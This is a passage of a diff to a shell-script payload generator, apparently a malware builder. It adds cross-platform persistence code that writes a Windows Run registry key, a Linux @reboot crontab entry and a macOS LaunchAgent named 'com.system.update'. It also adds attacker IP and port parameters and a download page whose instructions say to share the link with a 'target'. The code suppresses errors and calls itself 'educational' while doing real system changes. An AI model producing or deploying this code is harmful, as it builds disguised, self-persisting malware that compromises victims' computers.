+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>
+"""
+            
+            plist_path = f"/Users/{os.getenv('USER')}/Library/LaunchAgents/com.system.update.plist"
+            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
+            with open(plist_path, "w") as f:
+                f.write(plist_content)
+                
+            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+            
+    except Exception as e:
+        # Silently handle errors in educational context
+        pass
 
 def demonstrate_stealth():
     print("Demonstrating system stealth concepts...")
@@ -1224,18 +1966,104 @@ def demonstrate_stealth():
     print("Simulating file hiding (educational)...")
     time.sleep(1)
     print("Simulation complete - no system modifications made.")
+    
+    if AUTO_EXECUTION:
+        print("Auto-execution is enabled for educational purposes.")
+        print("In a real scenario, this would hide itself on system startup.")
 
 if __name__ == "__main__":
+    # Set up persistence if auto-execution is enabled
+    setup_persistence()
+    
     demonstrate_stealth()
 EOF
 }
 
 create_custom_payload() {
-    cat > payload.py << 'EOF'
+    local attacker_ip=$1
+    local attacker_port=$2
+    local encryption_key=$3
+    local target_os=${4:-"Unknown"}
+    
+    cat > payload.py << EOF
 #!/usr/bin/env python3
 import sys
 import time
 import platform
+import subprocess
+import os
+
+# Auto-execution setup
+AUTO_EXECUTION = $AUTO_EXECUTION
+
+def setup_persistence():
+    """Set up persistence mechanisms based on the target OS"""
+    if not AUTO_EXECUTION:
+        return
+    
+    try:
+        system = platform.system()
+        
+        if system == "Windows":
+            # Windows registry persistence
+            import winreg
+            
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Add to registry run key
+            key = winreg.HKEY_CURRENT_USER
+            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
+                winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+                
+        elif system == "Linux":
+            # Linux cron job persistence
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Add to crontab
+            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+            with open("/tmp/crontab.txt", "w") as f:
+                f.write(cron_job)
+            
+            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+            os.remove("/tmp/crontab.txt")
+            
+        elif system == "Darwin":  # macOS
+            # macOS launchd persistence
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # Create launchd plist
+            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>
+"""
+            
+            plist_path = f"/Users/{os.getenv('USER')}/Library/LaunchAgents/com.system.update.plist"
+            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
+            with open(plist_path, "w") as f:
+                f.write(plist_content)
+                
+            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+            
+    except Exception as e:
+        # Silently handle errors in educational context
+        pass
 
 class CustomPayload:
     def __init__(self):
@@ -1259,6 +2087,11 @@ class CustomPayload:
             print(f"{key}: {value}")
         print("=" * 40)
         print("This is an educational framework only.")
+        
+        if AUTO_EXECUTION:
+            print("Auto-execution is enabled for educational purposes.")
+            print("In a real scenario, this would run on system startup.")
+        
         time.sleep(2)
     
     def run(self):
@@ -1267,6 +2100,9 @@ class CustomPayload:
         self.display_info()
 
 def main():
+    # Set up persistence if auto-execution is enabled
+    setup_persistence()
+    
     payload = CustomPayload()
     payload.run()
 
@@ -1507,6 +2343,7 @@ def index():
             <p><strong>Filename:</strong> $(basename "$payload_path")</p>
             <p><strong>Size:</strong> $(stat -f%z "$payload_path" 2>/dev/null || stat -c%s "$payload_path") bytes</p>
             <p><strong>Type:</strong> Secure Executable</p>
+            <p><strong>Auto-Execution:</strong> $([ "$AUTO_EXECUTION" = true ] && echo "Enabled" || echo "Disabled")</p>
         </div>
         <div style="text-align: center;">
             <a href="/download" class="download-btn">Download File</a>
@@ -1567,6 +2404,7 @@ Server PID: $server_pid
 Tunnel PID: $(cat "$TEMP_DIR/tunnel.pid" 2>/dev/null || echo "N/A")
 Start Time: $(date)
 Payload: $(basename "$payload_path")
+Auto-Execution: $([ "$AUTO_EXECUTION" = true ] && echo "Enabled" || echo "Disabled")
 
 Usage:
 1. Share the tunnel URL with your target
@@ -1786,10 +2624,20 @@ main() {
         if [ "$TARGET_OS" == "Cross-platform" ]; then
             echo -e "${G}>> CROSS-PLATFORM PAYLOAD GENERATION COMPLETE. Check the 'cross_platform_builds' directory.${NC}"
             echo -e "${G}>> Use launcher.sh (Unix) or launcher.bat (Windows) for deployment.${NC}"
+            if [ "$AUTO_EXECUTION" = true ]; then
+                echo -e "${G}>> Auto-execution is ENABLED - payload will run automatically on installation.${NC}"
+            else
+                echo -e "${Y}>> Auto-execution is DISABLED - payload requires manual execution.${NC}"
+            fi
             log_message "SUCCESS" "Cross-platform payload generation completed successfully"
         else
             echo -e "${G}>> PAYLOAD GENERATION COMPLETE. Check the parent directory for '$FINAL_NAME'.${NC}"
             echo -e "${G}>> Metadata saved as '${FINAL_NAME}.meta'${NC}"
+            if [ "$AUTO_EXECUTION" = true ]; then
+                echo -e "${G}>> Auto-execution is ENABLED - payload will run automatically on installation.${NC}"
+            else
+                echo -e "${Y}>> Auto-execution is DISABLED - payload requires manual execution.${NC}"
+            fi
             log_message "SUCCESS" "Payload generation completed successfully"
         fi
         
